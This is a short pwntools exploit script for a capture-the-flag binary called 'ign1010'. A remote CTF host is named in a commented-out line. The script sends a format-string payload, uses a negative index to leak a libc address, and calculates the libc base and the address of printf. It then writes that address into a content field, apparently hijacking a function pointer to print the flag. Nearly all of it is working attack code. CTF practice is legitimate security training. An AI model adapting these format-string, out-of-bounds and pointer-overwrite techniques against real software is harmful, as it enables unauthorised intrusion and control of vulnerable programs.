from pwn import *

p = process("./ign1010")
# p = remote('ctf.adl.tw', 10007)

l = ELF('./libc.so.6')
context.arch = 'amd64'

# Setup format string 
p.sendlineafter(b'> ', str(2))
p.sendlineafter(b'idx> ', str(0))
p.sendlineafter(b'4.comment\n> ', str(1))
p.sendlineafter(b'Content:', b'%8$p %9$p %10$p %11$p %12$p %13$p')

# Get libc base address
p.sendlineafter(b'> ', str(2))
p.sendlineafter(b'idx> ', str(-2))
p.recv(13)
addr = p.recv(6)
main_addr = int.from_bytes(addr, byteorder='little')

# Calculate printf address based on libc base address
main_offset = l.symbols["__libc_start_main"]
printf_offset = l.symbols["printf"]
libc_base = main_addr - main_offset
printf_plt = libc_base + printf_offset

# printf flag 
p.sendlineafter(b'4.comment\n> ', str(3))
p.sendafter(b'Content:', p64(printf_plt))

p.interactive()
